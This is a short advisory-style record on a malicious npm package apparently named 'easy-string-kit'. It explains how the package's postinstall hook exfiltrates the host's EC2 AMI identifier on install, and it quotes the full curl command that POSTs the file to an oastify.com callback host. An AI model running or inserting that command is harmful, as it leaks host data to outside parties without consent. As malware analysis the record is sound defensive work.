summary: postinstall exfiltrates EC2 AMI identifier to Burp Collaborator OAST host
details: package.json declares a postinstall lifecycle script that runs on every npm install: `curl -X POST -d "$(cat /data/ami-id)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data`. This reads the AWS EC2 AMI identifier from the installer's host and POSTs it over plain HTTP to an attacker-controlled oastify.com subdomain (Burp Collaborator out-of-band callback host). Auto-executes without user consent and is unrelated to any documented package purpose; the internal name claims to be `easy-string-kit`, while author, repository, and homepage metadata fields are empty and a keyword contains an embedded shell fragment (`trunls -lae`). The shape — throwaway name, missing maintainer metadata, OAST exfil of a host identifier on install — is consistent with reconnaissance / dependency-confusion probing of internal build environments.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
